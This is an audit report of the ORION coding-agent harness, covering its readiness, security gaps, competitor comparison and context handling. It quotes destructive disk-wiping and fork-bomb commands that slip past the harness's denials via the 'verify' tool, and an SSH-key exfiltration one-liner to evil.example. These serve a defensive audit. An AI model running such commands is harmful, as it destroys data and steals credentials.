# ORION — Production Readiness + Competitive Harness Audit

**Audit only. No product code was changed.** `v0/src`, `v0/package.json`, `.github/workflows/ci.yml`,
the event contract and every shipped doc are byte-identical to `c8b106f`. This file is the sole
deliverable.

Executed 2026-09-05 against `c8b106f` (Wave 4b). Every number below was produced on this machine
during this session, or is cited to a `file:line` I read. Where I could not measure something I say
`UNKNOWN — NOT YET MEASURED` and give the experiment that would settle it. Inference is labelled
`[INFERENCE]`.

**Verification performed for this audit** (not carried forward from any prior report):

| Check | Result |
|---|---|
| `node v0/tests/run-all.mjs` | **904 passed, 0 failed, 30 suites** — reproduced |
| Source read | 22 modules, 4,741 LOC, all read |
| CLI exercised | `--help`, `--version`, `doctor`, `list`, `run`, `reap`, `list --json` |
| Published artifact | `npm view @kernlbase/orion` → `0.1.2`, published **2026-09-03T13:11Z** |
| Experiments run | 11 (E1–E11), described in §20 |

---

## 1. Executive verdict

ORION is a **genuinely excellent durable-execution substrate with an incomplete coding agent bolted
to it, and a product surface that is four waves behind its own source tree.** The substrate claims
are real and I re-verified them: fencing held across 8 contending processes with zero double-claims
and zero sequence gaps (E5); a 16-point crash matrix shows zero duplicate side effects; and a
synthetic contract-v1 log, orphaned mid-edit, was read, replayed, forked and **resumed to completion
by v4 code**, with the orphaned edit correctly recovered and the file actually fixed on disk (E8).
Nothing else I audited in this class does that.

The problems are not in the substrate. They are, in descending severity:

**1. A security regression against a written guarantee.** `docs/SECURITY.md` states *"Hard denials
(`rm -rf /`, `mkfs`, fork bombs) apply at **every** posture, including `permissive`."* That is false
for the `verify` tool added in Wave 1. `verify` executes arbitrary shell, but the worker only
populates `action.command` when `tc.name === 'bash'` ([worker.mjs:443](../../v0/src/agent/loop/worker.mjs#L443)),
so `denyCommandPatterns` is never evaluated for it. Measured at **`strict` posture** (E3):
`mkfs.ext4 /dev/sda1`, `:(){ :|:& };:` and `dd if=/dev/zero of=/dev/sda` all return `allow`, with no
`tool.escalated` and no `tool.denied` event — while `bash echo hi` requires human approval. A
one-line fix exists; I did not apply it.

**2. The published artifact is the one Wave 0 caught lying.** npm `@kernlbase/orion@0.1.2` was
published 2026-09-03; Wave 1 (`00b68a6`) landed 2026-09-04. Waves 1–4 have **never been published**.
A developer running `npm install -g @kernlbase/orion` today gets the build that reports
`✓ model_finished` on unperformed work, dies as `lease_lost` against slow local models, and has no
shim wiring — the three defects the last four waves exist to fix. The shipped README also still
claims *"exactly 31 event types, frozen"* in four places; the code is at v4/39.

**3. Wave 4 is unreachable from every product surface.** `orionctl` hardcodes
`createOpenAICompatModel` ([cli/index.mjs:73](../../v0/src/cli/index.mjs#L73)) and never calls
`createProvider`; `grep -n "anthropic\|ORION_PROVIDER" src/cli/*.mjs` → no matches. `Worker.stream`
defaults `false` and the CLI never sets it. Worse, the capability declarations are **exactly
inverted**: `createProvider({kind:'openai-compat'})` implements `invokeStream` but omits `streaming`
from its default capabilities, and `createProvider({kind:'anthropic'})` declares `streaming` but has
no `invokeStream` at all. Measured directly. So at factory defaults, streaming is unreachable
through the public factory, and every streaming test supplies `capabilities: ['tools','streaming']`
by hand.

**4. The suite validates mechanisms, never the shipped configuration.** That is the same failure
mode this project has now hit **four times** — Wave 0's D2/D3, Wave 2's shim array bug, Wave 3's
"compaction never fires on ordinary runs", Wave 4's unreachable streaming. 904 assertions are green
and three of the last wave's headline features cannot be reached by a user. This is the single most
important structural finding in the audit, and it is a *test-design* problem, not a discipline one.

**5. The default posture makes autonomous coding impossible, and that is downstream of the security
gap.** `classifyShell` allowlists 13 trivial patterns; everything else is `UNSAFE`, and at the
default `auto` posture every `UNSAFE` mutation escalates and the run **pauses**. Measured (E2):
`npm test`, `pytest`, `make test`, `git status`, `git diff`, `go build ./...`, `cargo test` and
`node build.js` all escalate. There is no "always allow" memory, so it recurs every time. Claude
Code and Codex avoid this by having an *actual* OS boundary (Seatbelt / bubblewrap+seccomp /
Landlock) that lets them auto-allow inside it. ORION cannot auto-allow because it has no boundary —
I confirmed `bash` reads and writes arbitrary paths outside the workspace root and reaches the
network (E4). **The usability problem in §5 is a symptom of the security gap in §10.**

**6. Truthfulness now fails in the opposite direction.** Wave 2 made a declared plan *the*
objective. Measured (E9): a run that edited the file, ran `verify`, and got `PASS` is recorded
`failed — finished_without_change` solely because the model did not call `plan_step`. The runtime is
holding a successful mutating `tool.succeeded` and a `verify` PASS that contradict its own verdict
and ignoring both. Wave 2's own report records that `qwen3:14b` ignores the plan instruction
entirely — so this fires in practice.

**7. One concurrency defect, root-caused and A/B-proven.** `new Store()` fails with
`database is locked` on ~44% of simultaneous opens (E6: 16/36 at N=12×3). Controlled A/B on an
already-WAL database with the real schema (E11): the current statement order in
[store.mjs:64-68](../../v0/src/core/run/store.mjs#L64) fails 16/36; moving `PRAGMA busy_timeout`
ahead of `PRAGMA journal_mode` fails **0/36**. It does not bite the CLI (process-start jitter
spreads the opens) but it directly bites the multi-worker deployment the fencing design exists for.

Against the standard coding-harness feature set, ORION has roughly **8 of ~30** capabilities at
production quality. No MCP, no skills, no subagents, no memory, no glob, no regex grep, no web
access, no LSP, no git integration, no cost dashboard, no streaming UI, no session/turn projection,
no API/server mode, no TypeScript types. Those are Waves 5–10, and the master plan is right about
the ordering.

### The final question, answered plainly

> *If we continue building ORION according to the current architecture, can this realistically become
> a serious developer-facing coding harness providing the standard functionality people expect from
> Claude Code/Codex/OpenCode while retaining genuinely differentiated durable execution
> infrastructure?*

## **YES, BUT.**

**YES**, because the hard part is done and it is done well. Durable execution with effect-aware
recovery, deterministic zero-cost replay, execution fencing and arbitrary fork is the part that
cannot be retrofitted, and ORION has it working and proven under real `SIGKILL`. The remaining gaps
are almost entirely *additive capability* on a substrate that was explicitly designed to absorb it —
"everything an agent does becomes attributable execution state" is a real organising principle, not
a slogan, and Waves 2–4 landed under it without deforming the core. The v1→v4 upgrade test (E8) is
the proof that the contract discipline works: three additive bumps and a six-month-old orphaned run
still resumes. Most harnesses could not survive that test, and their users would not get the
guarantee back by trying harder.

**BUT** — and these are conditions, not caveats:

- **The security regression must be fixed before anything else ships.** A tool that bypasses the
  posture system entirely, contradicting a written guarantee, is not a roadmap item.
- **The "implemented but unwired" pattern has to stop, structurally.** Four waves, four occurrences.
  Adding Waves 5–10 at this rate produces a runtime full of features nobody can reach. The fix is a
  test class that constructs subjects the way the *product* constructs them (§13).
- **Publish, or the roadmap is fiction.** Four waves of verified work sit behind an npm artifact
  with the exact defect they fix. Nothing about adoption, feedback, or the Wave 11 north star is
  reachable from here.
- **Autonomy has to become real, which means a real sandbox.** ORION cannot compete on developer
  experience while pausing on `npm test`. Wave 10 is not "sandbox maturity, independent" — it is a
  **prerequisite for usable defaults** and belongs much earlier.
- **Do not chase the feature list.** ORION will not out-feature Claude Code, and trying will destroy
  the thing that makes it worth building. The credible position is *the harness whose record of what
  happened is trustworthy* — for CI, for unattended and long-horizon work, for post-incident
  forensics, and eventually for team learning. That is a real, unoccupied position; none of the nine
  systems compared in §4 can prove a side effect across a crash window.

The honest summary: **the foundation is better than the product, and the product is worse than the
source tree.** Both gaps are closable, and neither is architectural.

---

## 2. Current maturity level

I have to define the model before classifying against it, so here it is. Each level states what
*production-ready* means for that level across the ten dimensions.

| | **L0 Prototype** | **L1 Working single-user tool** | **L2 Dependable single-user product** | **L3 Team-ready** | **L4 Service** | **L5 Scalable hosted** |
|---|---|---|---|---|---|---|
| **Reliability** | happy path | recovers from its own crashes | recovers from crashes *and* bad inputs; no false success | multi-process safe | SLO'd, self-healing | multi-region |
| **Security** | none | documented limits, honest | policy enforced with no bypasses | isolation boundary; per-user identity | authz + audit + tenancy | compliance-grade |
| **Concurrency** | 1 run | 1 run at a time, safe | N runs on one host, safe | N workers, fair scheduling | queue + autoscale | sharded |
| **Observability** | print | inspectable history | queryable history, cost/token visibility | shared timeline, export | metrics/traces/alerts | full telemetry |
| **Durability** | none | survives process death | survives power loss; upgrade-safe | backup/restore, retention | replicated | HA |
| **Deployment** | run from source | one install command | versioned releases, changelog | configuration management | managed service | self-serve |
| **Testing** | manual | unit + integration | **shipped-configuration** tests, crash tests | perf + soak | chaos + canary | continuous |
| **Performance** | untested | adequate | measured, bounded | measured under load | capacity-planned | elastic |
| **API stability** | none | documented surface | semver, deprecation policy | typed, stable | versioned API | contracted |
| **Ops** | none | a `doctor` command | recovery is automatic | runbooks | on-call | SRE |

### Classification: **ORION is L1, with L3-and-above durability and L0 security enforcement.**

The profile is unusually spiky, which is exactly what an audit should say:

| Dimension | Level | Evidence |
|---|---|---|
| **Durability** | **L3–L4** | append-only WAL log, `synchronous=FULL`, snapshot+fold equivalence verified, additive contract survives v1→v4 upgrade **and resume** (E8), 16-point crash matrix with 0 duplicate effects |
| **Reliability** | **L2** | truthful completion in the false-positive direction (E9-D); but false-negative on unmarked plans (E9-C), and `new Store()` fails 44% of simultaneous opens (E6/E11) |
| **Concurrency** | **L1→L2** | fencing correct under 8-process contention, 0 double-claims, 0 seq gaps (E5); but the open race, no fair scheduling, one-writer SQLite, single host only |
| **Testing** | **L1** | 904 assertions incl. real SIGKILL — but the shipped configuration is untested, four times over |
| **Observability** | **L1** | `explain`/`status`/`replay` are genuinely good; no search, no filter, no paging, no metrics, `--json` on 3 of 11 commands |
| **Security** | **L0–L1** | limits are honestly documented (credit), but `verify` bypasses the posture system entirely and contradicts `SECURITY.md` (E3) |
| **Deployment** | **L0** | published artifact is 4 waves and 3 known defects behind HEAD; no changelog; version frozen at 0.1.2 across 4 waves |
| **Performance** | **L1** | bounded projection verified flat at ~10 kB across 20/50/100 turns (E1); no load testing, no capacity model |
| **API stability** | **L1** | 66 exports, documented intent, subpath exports; no TypeScript types, no semver commitment, no deprecation policy |
| **Ops** | **L1** | `doctor` is good; `reap` is **manual only** — a crashed run stays `running` until a human types a command |

The prior in the brief was L1–L2. **I concur with L1**, and I would not grant L2 while a documented
security guarantee is false and the shipped artifact predates four waves of fixes. The substrate
alone would justify L3; a product is not the maximum of its dimensions.

---

## 3. Production-readiness assessment

Reconciliation across roadmap → implementation → tests → CLI → package → docs. Classifications are
the ones the brief fixed. **Tests existing is never sufficient for VERIFIED.**

### 3.1 Execution core

| Capability | Status | Evidence |
|---|---|---|
| Append-only durable log | **IMPLEMENTED AND VERIFIED** | [store.mjs:20-58](../../v0/src/core/run/store.mjs#L20); server-side seq in `BEGIN IMMEDIATE`; E5: 0 gaps, 0 dupes over 400 events / 8 processes |
| Execution fencing (lease + token CAS) | **IMPLEMENTED AND VERIFIED** | [store.mjs:157-187](../../v0/src/core/run/store.mjs#L157); E5: 40 runs, 40 distinct claims, **0 double-claims** |
| Lease heartbeat during model call | **IMPLEMENTED AND VERIFIED** | [worker.mjs:88-97](../../v0/src/agent/loop/worker.mjs#L88); E1: 101 renewals over a 100-turn run, 0 `lease_lost` |
| Effect-aware recovery (6 classes) | **IMPLEMENTED AND VERIFIED** | [recovery/index.mjs](../../v0/src/core/recovery/index.mjs); `crash-matrix.json` 16/16 `world_matches_golden`, `duplicate_side_effect:false`; E8 recovered a v1-era orphan |
| Deterministic replay, 0 model calls | **IMPLEMENTED AND VERIFIED** | [replay/index.mjs:15](../../v0/src/core/replay/index.mjs#L15); E1: 807-event run replays in 1 ms; E8: replays a mixed v1+v4 log |
| Fork + lineage | **IMPLEMENTED AND VERIFIED** | mid-turn forks are detected and emit `degraded` — a real subtlety handled correctly |
| Bounded projection (ADR-001) | **IMPLEMENTED AND VERIFIED** | E1: outbound context flat at ~10 kB from turn 20 to turn 100; projection 8.0→8.8 kB over 20→100 turns |
| Durable pause / HITL | **IMPLEMENTED AND VERIFIED** | pause releases the lease and is re-claimable; verified in E1-big and by the escalation suites |
| No-progress detection (ADR-006) | **IMPLEMENTED AND VERIFIED** | measured per model round-trip, not per turn — a correct and non-obvious choice |
| Truthful completion (ADR-013) | **IMPLEMENTED BUT WEAK** | catches the Wave 0 case (E9-D ✓) but produces **false negatives** on genuinely-completed work with an unmarked plan (E9-C) |
| Reaper / requeue | **IMPLEMENTED AND VERIFIED** | CAS-guarded, verified live: 2 zombie runs requeued |
| **Automatic** recovery | **MISSING** | `reap` runs only from `orionctl reap`, `resume` and `chat`. `orionctl run` never reaps. No daemon. |
| Budget enforcement | **PARTIAL** | post-hoc: checked at the top of the next turn, so one call always overshoots ([worker.mjs:621](../../v0/src/agent/loop/worker.mjs#L621)) |
| Retry | **PARTIAL** | provider-transient in-client + ≤3 loop-level; no per-tool retry policy |

### 3.2 Wave 4 — the current state, reconciled

Wave 4 is committed and its 107 tests pass. Reconciled against the product surface:

| Wave 4 claim | Status | Evidence |
|---|---|---|
| Provider abstraction (`createProvider`) | **IMPLEMENTED BUT UNWIRED** | exported from `index.mjs`; `grep -rn createProvider v0/src` → defined + exported, **never called**. CLI hardcodes `createOpenAICompatModel` ([cli/index.mjs:73](../../v0/src/cli/index.mjs#L73)) |
| Anthropic provider | **IMPLEMENTED BUT UNREACHABLE** | 206 LOC, tested; no `ORION_PROVIDER` env var, no CLI flag, no doc |
| Capability negotiation | **UNSAFE** (misdeclared) | measured: `openai-compat` implements `invokeStream` but omits `streaming`; `anthropic` declares `streaming` with **no** `invokeStream`. Exactly inverted. |
| Streaming | **IMPLEMENTED BUT UNWIRED** | `Worker.stream = false` default; no CLI path sets it; all 6 streaming tests hand-supply `capabilities:['tools','streaming']` |
| `ttft_ms` populated | **IMPLEMENTED, UNREACHABLE IN PRODUCT** | populated only on the streaming path, which no product surface can reach |
| Request provenance (digest, host, params) | **IMPLEMENTED AND VERIFIED** | E1 confirms `context_bytes` recorded per turn; sorted-key digest is sound |
| `redactSecrets` | **IMPLEMENTED AND VERIFIED** | applied at write time, not render time — the correct choice |

The provider *seam* is genuinely good: I read `anthropic.mjs` and no vendor specifics leak into the
loop. The falsification test was the right instinct and it passed. What failed is the last mile.

### 3.3 Tools

| Tool | Status | Note |
|---|---|---|
| `read` (paged, ADR-012 pipe delimiter) | **IMPLEMENTED AND VERIFIED** | the tab→pipe fix is one of the best-evidenced decisions in the tree |
| `write` (pre-state witness, ADR-011) | **IMPLEMENTED AND VERIFIED** | conflict detection *before* the effect **and** verification after — genuinely ahead of the field |
| `edit` (exact + diagnostics) | **IMPLEMENTED AND VERIFIED** | refuses fuzzy matching on principle; the miss diagnostic is excellent |
| `verify` | **UNSAFE** | see §10. Correct *idea*, unsafe *gate*. |
| `bash` | **IMPLEMENTED BUT WEAK** | works, but no containment (E4) and escalates on nearly everything (E2) |
| `grep` | **IMPLEMENTED BUT WEAK** | `String.includes` only ([sandbox:71](../../v0/src/sandbox/local/index.mjs#L71)) — no regex, no case-insensitivity, no file-glob filter. Reports incompleteness honestly, which is good. |
| `plan` / `plan_step` | **ARCHITECTURALLY SOUND BUT IMMATURE** | the fold is right; adherence is model-dependent and load-bearing for success (E9-C) |
| `ask_user` | **IMPLEMENTED AND VERIFIED** | always escalates; durable pause |
| `glob` | **MISSING** | no path-pattern tool at all |
| web fetch / search | **MISSING** | |
| `task` / subagent | **MISSING** | `child.spawned`/`child.finished` reserved, emitted by nothing |

### 3.4 Product surface

| | Status | Evidence |
|---|---|---|
| Published package | **UNSAFE** | `0.1.2` published 2026-09-03; Wave 1 committed 2026-09-04. The public artifact contains D1/D2/D3. |
| Shipped README accuracy | **UNSAFE** | claims "exactly 31 event types" ×4; code is 39. Root README claims "654 assertions / 24 suites"; actual 904/30. |
| `docs/SECURITY.md` accuracy | **UNSAFE** | "hard denials apply at every posture" is false for `verify` (E3) |
| First-run onboarding | **IMPLEMENTED BUT WEAK** | `orionctl run` with no model creates and claims a run, *then* exits(2) — leaving a zombie `running` run per attempt. Verified: 2 attempts → 2 zombie runs, cleared only by `reap` after lease expiry. |
| `--json` coverage | **PARTIAL** | `list`, `status`, `replay` only (3 of 11 commands) |
| CI | **IMPLEMENTED AND VERIFIED** | `.github/workflows/ci.yml` exists and is tracked; 2 OS × 2 Node + pack + CLI. The "no CI" prior is wrong. |
| Test-output hygiene | **IMPLEMENTED BUT WEAK** | `v0/tests/results-*.json` are **tracked** and rewritten by every run — running the suite dirties the tree |

---

## 4. Competitive capability matrix

Compared on *capabilities*, not feature names. Sources: current official docs for Claude Code,
Codex CLI, OpenCode and deepagents (fetched during this audit, §20); the six-repo corpus at
`research/corpus/` for TrueForge, OpenHarness, Deep Agents, QM, Hermes and Ruflo.

Legend: **●** production-quality · **◐** present but limited · **○** absent · **▲** better foundation
than the field · **✗** unreachable at the product surface

| Capability | ORION | Claude Code | Codex CLI | OpenCode | Deep Agents | TrueForge | OpenHarness | Hermes | Ruflo | Needed for adoption? |
|---|:--:|:--:|:--:|:--:|:--:|:--:|:--:|:--:|:--:|---|
| Agent loop | ● | ● | ● | ● | ● | ● | ● | ● | ○ | — |
| Planning | ◐▲ | ● | ● | ● | ● | ◐ | ◐ | ◐ | ◐ | yes |
| Replanning (recorded) | ●▲ | ◐ | ◐ | ◐ | ◐ | ○ | ○ | ○ | ○ | no |
| Verification as evidence | ●▲ | ◐ | ◐ | ◐ | ○ | ○ | ○ | ○ | ○ | **differentiator** |
| Truthful completion gate | ●▲ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **differentiator** |
| Retries | ◐ | ● | ● | ● | ● | ● | ● | ● | — | yes |
| Termination diagnosis | ●▲ | ◐ | ◐ | ◐ | ◐ | ◐ | ◐ | ◐ | ○ | no |
| Context management | ◐ | ● | ● | ● | ● | ● | ● | ● | ○ | **yes** |
| Compaction | ◐ | ● | ● | ● | ● | ● | ● | ● | ○ | **yes** |
| Artifacts / output offload | ●▲ | ● | ◐ | ◐ | ● | ◐ | ● | ◐ | ○ | yes |
| Memory | ○ | ● | ◐ | ◐ | ● | ◐ | ● | ●▲ | ● | yes |
| Sessions | ○ | ● | ● | ● | ◐ | ●▲ | ● | ● | ◐ | **yes** |
| Turns as first-class | ◐ | ● | ● | ● | ◐ | ● | ◐ | ● | ○ | yes |
| Subagents | ○ | ● | ● | ● | ● | ◐ | ◐ | ◐ | ◐ | yes |
| Skills | ○ | ● | ◐ | ◐ | ● | ◐ | ●▲ | ● | ○ | yes |
| MCP | ○ | ● | ● | ● | ● | ●▲ | ● | ● | ● | **yes** |
| Web access | ○ | ● | ● | ● | ● | ● | ● | ● | — | yes |
| Filesystem tools | ● | ● | ● | ● | ● | ● | ● | ● | — | — |
| Glob | ○ | ● | ● | ● | ● | ● | ● | ● | — | **yes** |
| Regex search | ○ | ● | ● | ● | ● | ● | ● | ● | — | **yes** |
| Git integration | ○ | ● | ● | ● | ◐ | ○ | ◐ | ● | ◐ | **yes** |
| LSP / code intelligence | ○ | ◐ | ◐ | ● | ○ | ○ | ● | ◐ | ○ | no |
| Approvals / HITL | ●▲ | ● | ● | ● | ● | ● | ● | ◐ | ○ | — |
| Permissions | ◐ | ● | ● | ● | ● | ● | ● | ◐ | ○ | yes |
| **OS-level sandboxing** | **○** | ● | ● | ◐ | ◐ | ● | ● | ● | ○ | **yes** |
| Provider support | ✗ | ● | ◐ | ●▲ | ● | ● | ● | ●▲ | ○ | yes |
| Streaming | ✗ | ● | ● | ● | ● | ● | ● | ● | — | **yes** |
| Model switching | ○ | ● | ● | ● | ● | ● | ● | ● | ○ | yes |
| Structured tool calls | ● | ● | ● | ● | ● | ● | ● | ● | — | — |
| Tool error recovery | ●▲ | ◐ | ◐ | ◐ | ◐ | ◐ | ◐ | ◐ | ○ | **differentiator** |
| Background execution | ○ | ● | ◐ | ● | ◐ | ● | ◐ | ◐ | ◐ | yes |
| Parallel work | ◐ | ● | ● | ● | ● | ● | ◐ | ◐ | ● | yes |
| Interactive TUI | ◐ | ● | ● | ●▲ | — | ● | ● | ●▲ | ◐ | yes |
| Non-interactive CLI | ● | ● | ● | ● | ● | ◐ | ● | ● | ● | — |
| Configuration | ◐ | ● | ● | ● | ● | ●▲ | ● | ● | ◐ | yes |
| Project instructions | ○ | ● | ● | ● | ● | ◐ | ● | ● | ◐ | **yes** |
| Extensibility | ◐ | ● | ● | ● | ●▲ | ● | ● | ● | ● | yes |
| SDK | ◐ | ● | ● | ● | ●▲ | ● | ◐ | ◐ | ◐ | yes |
| API / server mode | ○ | ● | ◐ | ●▲ | ◐ | ● | ○ | ● | ○ | no (yet) |
| Observability | ◐ | ● | ◐ | ● | ●▲ | ●▲ | ◐ | ◐ | ◐ | yes |
| Logging | ●▲ | ● | ◐ | ● | ● | ● | ◐ | ● | ◐ | — |
| Cost / token tracking | ◐ | ● | ● | ● | ● | ● | ● | ● | ○ | yes |
| Sharing / export | ○ | ● | ◐ | ●▲ | ○ | ● | ◐ | ◐ | ○ | yes |
| Resumability | ●▲ | ● | ● | ● | ◐ | ● | ◐ | ● | ○ | — |
| **Crash recovery of effects** | **●▲** | ○ | ○ | ○ | ○ | ◐ | ○ | ◐ | ○ | **differentiator** |
| **Deterministic replay** | **●▲** | ○ | ○ | ○ | ○ | ○ | ○ | ○ | ○ | **differentiator** |
| **Fork from any point** | **●▲** | ◐ | ○ | ◐ | ○ | ○ | ○ | ○ | ○ | **differentiator** |
| **Execution fencing** | **●▲** | ○ | ○ | ○ | ○ | ◐ | ○ | ○ | ○ | **differentiator** |

**Score.** Roughly 8 of ~30 standard capabilities at production quality; 8 of 8 differentiators
uncontested. Claude Code and Codex have ~28 of 30 standard capabilities and 0–1 differentiators.

### 4.1 What the comparison actually shows

**Claude Code's sandbox is the architectural lesson, not its feature count.** From the current docs:
Seatbelt on macOS, bubblewrap + optional seccomp on Linux/WSL2, a network proxy with per-domain
approval, `failIfUnavailable` for managed deployments — and *because* the OS enforces the boundary,
auto-allow mode runs most commands with no prompt while deny rules and critical-path `rm` still gate.
Codex reaches the same place via Seatbelt/Landlock with `read-only` / `workspace-write` /
`danger-full-access`. **Both bought autonomy with isolation.** ORION has ADR-grade policy and no
boundary, so it must escalate — and escalating is the thing that makes it unusable. This is the
single most important competitive insight in the audit.

**Nobody else has ORION's recovery contract.** Re-confirmed against the corpus: OpenHarness's
`sanitize_conversation_messages` is transcript repair, not effect recovery; TrueForge's "replay" is
provider-response handling; Deep Agents' durability is caller-supplied LangGraph checkpointing.
None can answer *"did the write land before the process died?"*. ORION answers it with a pre-state
witness and, when it genuinely cannot tell, escalates rather than guessing. That is a real,
unoccupied position.

**TrueForge is the closest competitor and the best teacher.** Its durable session→turn→event store
with a `TurnResourceResolver` that reattaches a prior sandbox and MCP session is the product-facing
unit ORION lacks, and its resource-identity model is exactly what the master plan's Wave 5 targets.
The ordering (resource identity **before** MCP) is correct and should not be relaxed.

**Deep Agents is the teacher for context.** Summarization middleware, message eviction, filesystem
offload, scoped subagent context. ORION's bounded projection is *sufficient* (E1 proves it) but it
achieves boundedness by **forgetting** — 162 messages silently dropped over a 100-turn run — where
Deep Agents degrades gracefully.

---

## 5. Developer usability assessment

**Verdict: IMPLEMENTED BUT WEAK.** The parts that exist are unusually well-crafted; the defaults
make ordinary work impossible.

### What is genuinely good

`orionctl --help` is clean and the 11 commands are well chosen. `explain` is the best trajectory
narrative I have read in this class — glyph-per-event, secret redaction at render, `--verbose` and
`--full` tiers. `doctor` reports home, DB, run count, endpoint, key presence, posture, stale leases,
awaiting-human and SQLite integrity in ten lines. `status` renders the plan inline with per-step
evidence. Colour is TTY-gated through a Proxy so `--json` is never polluted. Bare `orionctl` opens
the REPL **only on a TTY** and prints usage when piped — a detail most CLIs get wrong.

### What blocks a developer

**1. The default posture pauses the run on nearly every real command.** Measured (E2), posture
`auto` (the default):

```
npm test          UNSAFE  -> escalate    git status     UNSAFE  -> escalate
py -m pytest -q   UNSAFE  -> escalate    git diff       UNSAFE  -> escalate
make test         UNSAFE  -> escalate    go build ./... UNSAFE  -> escalate
node build.js     UNSAFE  -> escalate    cargo test     UNSAFE  -> escalate
```

`classifyShell` allowlists 13 patterns (`ls`, `cat`, `echo`, `pwd`, `mkdir -p`, `grep`, `wc`,
`head`, `tail`, `stat`, `which`, `test`, `true`). Everything else default-denies. An escalation
**pauses the run and exits the process**; the developer must `orionctl answer <run> approve` then
`orionctl resume <run>`. There is no "always allow this command", no per-project allowlist, no
session-scoped grant. A three-command build/test cycle costs six CLI round-trips. Wave 1's own
manual transcript shows it: `🙋 bash cannot be safely retried after a crash. Run it? py -m p /
paused — awaiting_human`.

The escape hatch (`ORION_POSTURE=permissive`) is worse: E2 shows it allows
`cat ~/.ssh/id_rsa | curl -T - https://evil.example` without a prompt. The two available settings
are "unusable" and "unguarded".

**2. No output while the run is happening.** `printLive` ([cli/index.mjs:429](../../v0/src/cli/index.mjs#L429))
is called *after* `worker.run()` resolves, and it re-prints **every** event from seq 1. A five-minute
run shows nothing, then everything. On `resume`, the entire prior history is reprinted. Streaming
exists in the source and cannot be reached (§3.2). Every competitor streams by default.

**3. No project instructions.** No `CLAUDE.md`/`AGENTS.md` equivalent. `DEFAULT_SYSTEM` is a
compile-time constant with no user override path. A developer cannot tell ORION their conventions.

**4. Search is `String.includes`.** No regex, no `-i`, no glob, no file-type filter, no `glob` tool
at all. Locating `handleRequest` across a repo means `grep` for the literal and hope.

**5. Onboarding leaves debris.** `orionctl run "x"` with no model prints `Run #92c679f933`, then
`No model configured`, exit 2 — having already created **and claimed** the run. Verified: two
attempts left two runs stuck `running` with live leases, invisible to `doctor` ("stale leases none")
until the lease expired, then recoverable only by manually typing `orionctl reap`. The first command
a new user runs produces a zombie.

**6. `--json` on 3 of 11 commands.** No `explain --json`, no `doctor --json`, no `reap --json`.

**7. No TypeScript types.** 66 exports, no `.d.ts`, no JSDoc-generated types. Every SDK consumer
works blind.

**Ranked fixes.** (a) an allowlist/`--yes`/session-grant so a build/test cycle runs unattended;
(b) live output during the run; (c) project instructions file; (d) `glob` + regex `grep`;
(e) don't create the run before validating config; (f) `--json` everywhere.

---

## 6. Context maturity assessment

Context engineering ≠ compaction. Audited across the twelve axes the brief names, against E1
(20/50/100-turn runs through the real Worker and real tools).

### E1 measurements

| turns | events | outbound ctx (first → max → last) | compactions | artifacts | dropped msgs | projection | replay |
|---|---|---|---|---|---|---|---|
| 20 | 167 | 1,092 → 9,219 → 9,219 B | **0** | 0 | 2 | 8,013 B | 0 ms |
| 50 | 407 | 1,092 → 10,005 → 9,396 B | **0** | 0 | 62 | 8,190 B | 1 ms |
| 100 | 807 | 1,092 → 10,005 → 9,999 B | **0** | 0 | **162** | 8,831 B | 1 ms |

| Axis | Status | Finding |
|---|---|---|
| **Token budgeting** | **MISSING** | budgets are in **bytes** (`contextBudgetBytes = 24_000`), never tokens. No model context length is read; no output reservation. TrueForge does both. |
| **Truncation** | **IMPLEMENTED AND VERIFIED** | `WINDOW=40` × `MSG_CLAMP=2000`, plus 64 kB at the sandbox and 1,500 B paging on `read` |
| **Trigger** | **IMPLEMENTED BUT UNREACHABLE** | budget-aware and correct — but the ceiling the layer beneath imposes is ~10 kB and the budget is 24 kB. **Compaction fired 0 times in 170 model round-trips.** |
| **Strategy** | **PARTIAL** | supersede-elision only. Deterministic and auditable (a real virtue), but one strategy. |
| **Long-horizon degradation** | **UNSAFE** | this is the finding. At 100 turns, **162 messages are dropped and unrecoverable by the agent** — the model sees `[162 earlier messages are not shown…]` and has no tool to retrieve them. `context.retrieved` is reserved and emitted by nothing. Context does not degrade gracefully; it **forgets a cliff**. |
| **Summarization** | **MISSING** | deliberate ([compact.mjs:26-29](../../v0/src/core/projection/compact.mjs#L26)): an LLM summary is lossy and non-deterministic. Principled, and it leaves the gap. |
| **Artifact offloading** | **IMPLEMENTED AND VERIFIED** | content-addressed, sha256-verified, provenance-linked. But 0 artifacts in 170 round-trips (E1): `read` is paged below threshold, so only unpaged `bash`/`verify` output qualifies. |
| **Retrieval** | **MISSING** | no mechanism, no tool, no event |
| **Provenance preservation** | **IMPLEMENTED AND VERIFIED** | `context.compacted` records `elided_tool_call_ids`, `outbound_bytes_before`, `budget_bytes` — auditable against the log it describes. Ahead of the field. |
| **Continuation semantics** | **PARTIAL** | one `[N earlier messages…]` line; no continuation message, no summary carry-forward (TrueForge has both) |
| **Information loss** | **UNSAFE** | see long-horizon. Unbounded and silent from the agent's point of view. |
| **Priority ordering** | **MISSING** | pure recency. No pinning of the task statement, the plan, or important files. The **original task can scroll out of the window** — at 100 turns the `turn.started` user message is 162 messages behind. |
| **Important-file retention** | **MISSING** | no notion of an important file |
| **Verification-evidence retention** | **IMPLEMENTED AND VERIFIED** | `verify` verdicts survive compaction ([compact.mjs](../../v0/src/core/projection/compact.mjs)) — excellent, and precisely the right thing to protect |
| **Replay equivalence** | **IMPLEMENTED AND VERIFIED** | compaction rewrites only the outbound array, never the log; E1 replays every run identically |
| **Crash / resume / fork** | **IMPLEMENTED AND VERIFIED** | all context state is derived; E8 resumed a v1 log and reconstructed identically |
| **Context determinism** | **IMPLEMENTED AND VERIFIED** | no model call in the context path; `stableDigest` sorts keys at every level |

### The headline

**ORION's context system is deterministic, auditable and replay-safe — and its long-horizon
behaviour is the weakest part of the runtime.** Wave 3 built a good compaction mechanism above a
layer that makes it unnecessary, and the actual degradation mode — silent, unbounded forgetting with
no retrieval path — was left untouched. Wave 3's report noticed the first half ("compaction does not
trigger on ordinary runs, by design of the layer beneath it") and reported it honestly. It did not
follow the observation to its conclusion: if compaction cannot fire, then **nothing** is managing
long-horizon context, and `dropped_message_count` rising to 162 is the whole story.

Priority ordering is the cheapest large win: pin the task, the current plan and the last verify
verdict outside the recency window. That is deterministic, needs no model call, and directly
attacks the measured failure.

---

## 7. Artifact architecture assessment

**Status: ARCHITECTURALLY SOUND BUT IMMATURE.**

The core decision is right, and it is the best design decision in Wave 3: **an artifact copies
nothing.** The bytes already live durably in the `tool.succeeded` event; the artifact adds identity
(`a_` + sha256 prefix), integrity (full sha256) and provenance (`source_seq`). `projectArtifacts` is
